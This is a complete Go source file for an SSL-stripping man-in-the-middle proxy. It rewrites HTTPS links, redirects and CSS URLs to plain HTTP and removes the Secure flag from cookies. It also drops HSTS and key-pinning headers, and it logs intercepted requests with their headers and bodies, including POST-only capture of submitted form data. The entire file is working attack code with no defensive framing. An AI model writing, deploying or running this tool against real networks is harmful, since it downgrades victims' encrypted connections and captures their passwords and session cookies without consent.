package sslstrip

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

type server struct {
	logger      io.Writer
	postOnly    bool
	logResponse bool
}

// clientLink stores client ip and url pair.
//
// We use as a key in the cache which stores
// the stripped links and their originals
type clientLink struct {
	clientIP string
	url      string
}

// storedLinks maps stripped urls to their originals
var storedLinks map[clientLink]string = make(map[clientLink]string, 0)
var mu sync.RWMutex

// client is the HTTP client we use to make requests
//
// We do not want our client to follow redirects so
// we change the default CheckRedirect function
var client = &http.Client{
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// ignoredRequestHeaders are the headers that will be ignored
// when sending the request to the server
var ignoredRequestHeaders = map[string]struct{}{
	"Cache-Control":     struct{}{},
	"If-Modified-Since": struct{}{},
	"If-None-Match":     struct{}{},
}

// ignoredResponseHeaders are the headers that will be ignored
// when sending the response to the user
var ignoredResponseHeaders = map[string]struct{}{
	// content length will change after stripping and needs to be recalculated
	"Content-Length": struct{}{},
	// hsts and hpkp headers
	"Public-Key-Pins":             struct{}{},
	"Public-Key-Pins-Report-Only": struct{}{},
	"Strict-Transport-Security":   struct{}{},
}

// getLink function gives the original url for the stripped one
func getLink(cl clientLink) (string, bool) {
	mu.RLock()
	defer mu.RUnlock()
	link, exists := storedLinks[cl]

	return link, exists
}

// storeLink stores the orginal url for the stripped one
func setLink(cl clientLink, link string) {
	mu.Lock()
	defer mu.Unlock()
	storedLinks[cl] = link
}

// normalizeIP extracts the IP part from the RemoteAddr
func normalizeIP(remoteAddr string) string {
	return strings.Split(remoteAddr, ":")[0]
}

func normalizeUrl(link string) (string, error) {
	originalUrl, err := url.Parse(link)

	if err != nil {
		return "", err
	}

	if originalUrl.Path == "" {
		originalUrl.Path = "/"
	}

	return originalUrl.String(), nil
}

func makeRequest(req *http.Request) (*http.Response, error) {
	// error will never happen
	u, _ := normalizeUrl(req.URL.String())

	cl := clientLink{
		clientIP: normalizeIP(req.RemoteAddr),
		url:      u,
	}

	// restore original link if cached
	if link, exists := getLink(cl); exists {
		originalUrl, err := req.URL.Parse(link)

		if err != nil {
			return nil, err
		}

		req.URL = originalUrl
	}

	// make request to server
	res, err := client.Do(req)

	if err != nil {
		return nil, err
	}

	return res, nil
}

func stripResponse(req *http.Request, res *http.Response) ([]byte, error) {
	// strip location header if exists
	location := res.Header.Get("Location")
	if strings.HasPrefix(location, "https") {
		strippedLocation, err := normalizeUrl("http" + location[5:])

		if err != nil {
			return nil, err
		}

		// cache original location
		forgedKey := clientLink{
			clientIP: normalizeIP(req.RemoteAddr),
			url:      strippedLocation,
		}
		setLink(forgedKey, location)
		res.Header.Set("Location", strippedLocation)
	}

	// strip secure cookies
	if cookies, exists := res.Header["Set-Cookie"]; exists {
		for i := 0; i < len(cookies); i++ {
			cookie := cookies[i]
			if idx := strings.LastIndex(cookie, "Secure"); idx != -1 {
				cookies[i] = cookie[:idx] + cookie[idx+6:]
			}
		}
	}

	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)

	if err != nil {
		return nil, fmt.Errorf("Error when reading response body: %q\n", err)
	}

	// strip all https links in the response body
	regex, _ := regexp.Compile("(https://[a-zA-Z0-9_:#@%/;$()~_?+-=\\.&]*)")
	strippedBody := regex.ReplaceAllFunc(body, func(u []byte) []byte {
		url := string(u)
		strippedUrl, err := normalizeUrl("http://" + url[8:])

		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not normalize url %s: %q\n", url, err)
			return u
		}

		// store original link for future requests
		key := clientLink{
			clientIP: normalizeIP(req.RemoteAddr),
			url:      strippedUrl,
		}
		setLink(key, url)
		return []byte(strippedUrl)
	})

	if strings.Contains(res.Header.Get("Content-Type"), "text/css") {
		cssUrlsRegex := regexp.MustCompile("url\\(['\"]?([a-zA-Z0-9_:#@%/;$~_?+-=\\.&]*)['\"]?\\)")
		strippedBody = cssUrlsRegex.ReplaceAllFunc(strippedBody, func(u []byte) []byte {
			url := string(u)

			if strings.HasPrefix(url, "url('http") || strings.HasPrefix(url, "url(\"http") ||
				strings.HasPrefix(url, "url(http") || strings.Contains(url, "base64") {
				return u
			}

			var absoluteUrl string
			if strings.HasPrefix(url, "url('/") || strings.HasPrefix(url, "url(\"/") {
				absoluteUrl = req.URL.Scheme + "://" + req.Host + url[5:len(url)-1]
			} else if strings.HasPrefix(url, "url(/") {
				absoluteUrl = req.URL.Scheme + "://" + req.Host + url[4:len(url)-1]
			} else if strings.HasPrefix(url, "url('") || strings.HasPrefix(url, "url(\"") {
				absoluteUrl = req.URL.Scheme + "://" + req.Host + req.URL.Path + "/" + url[5:len(url)-1]
			} else if strings.HasPrefix(url, "url(") {
				absoluteUrl = req.URL.Scheme + "://" + req.Host + req.URL.Path + "/" + url[4:len(url)-1]
			}

			strippedUrl := absoluteUrl
			if req.URL.Scheme == "https" {
				strippedUrl = "http" + absoluteUrl[5:]
			}

			// strippedUrl, err := normalizeUrl(strippedUrl)

			// if err != nil {
			// 	fmt.Fprintf(os.Stderr, "Warning: could not normalize url %s: %q\n", absoluteUrl, err)
			// 	return u
			// }

			// store original link for future requests
			key := clientLink{
				clientIP: normalizeIP(req.RemoteAddr),
				url:      strippedUrl,
			}
			setLink(key, absoluteUrl)

			return []byte("url('" + strippedUrl + "')")
		})
	}

	return strippedBody, nil
}

func (s server) ServeHTTP(responseWriter http.ResponseWriter, req *http.Request) {
	// read request body
	reqBody, err := ioutil.ReadAll(req.Body)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Could not get body: %q\n", err)
		return
	}
	if !s.postOnly || req.Method == "POST" {
		fmt.Fprintf(s.logger, "%q %q %q %q\nHeaders: %q\nBody: %q\n\n", time.Now().Format(time.RFC850), req.RemoteAddr, req.Method, req.URL, req.Header, reqBody)
	}

	proxyHeaders := make(http.Header)
	for key, value := range req.Header {
		if _, ignored := ignoredRequestHeaders[key]; !ignored {
			proxyHeaders[key] = value
		}
	}

	// build request to be made
	proxyReq := &http.Request{
		Method:     req.Method,
		URL:        req.URL,
		Header:     proxyHeaders,
		Host:       req.Host,
		Close:      req.Close,
		Body:       ioutil.NopCloser(bytes.NewReader(reqBody)),
		RemoteAddr: req.RemoteAddr,
	}

	// make request to the server
	res, err := makeRequest(proxyReq)

	if err != nil {
		fmt.Fprintf(os.Stderr, "Error occurred when making proxy request: %q\n", err)
		return
	}

	// decompress body before stripping if compressed
	if res.Header.Get("Content-Encoding") == "gzip" {
		reader, err := gzip.NewReader(res.Body)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error when decompressing response body: %q\n", err)
			return
		}
		res.Body = reader
	}

	// strip response
	strippedBody, err := stripResponse(proxyReq, res)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error when stripping response: %q\n", err)
		return
	}

	if s.logResponse {
		fmt.Fprintf(s.logger, "%q %q %q %q %q\nHeaders: %q\nBody: %q\n\n", time.Now().Format(time.RFC850), req.RemoteAddr, res.StatusCode, res.Status, req.URL, res.Header, strippedBody)
	}

	// compress stripped body if necessary
	if res.Header.Get("Content-Encoding") == "gzip" {
		var b bytes.Buffer
		writer := gzip.NewWriter(&b)
		writer.Write(strippedBody)
		writer.Flush()
		writer.Close()
		strippedBody = b.Bytes()
	}

	// build headers that will be returned to the client
	header := responseWriter.Header()
	for key, value := range res.Header {
		if _, ignored := ignoredResponseHeaders[key]; !ignored {
			header[key] = value
		}
	}

	responseWriter.WriteHeader(res.StatusCode)

	// send stripped body to client
	_, err = responseWriter.Write(strippedBody)

	if err != nil {
		fmt.Fprintf(os.Stderr, "Error when sending response body to client: %q\n", err)
		return
	}
}

type Params struct {
	Port        int
	Filename    string
	PostOnly    bool
	LogResponse bool
}

func Start(p Params) {
	var writer io.Writer = os.Stdout
	var err error

	if p.Filename != "" {
		writer, err = os.Create(p.Filename)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Could not open file %q: %q\n", p.Filename, err)
			return
		}
	}

	s := server{
		writer,
		p.PostOnly,
		p.LogResponse,
	}
	log.Fatal(http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", p.Port), s))
}
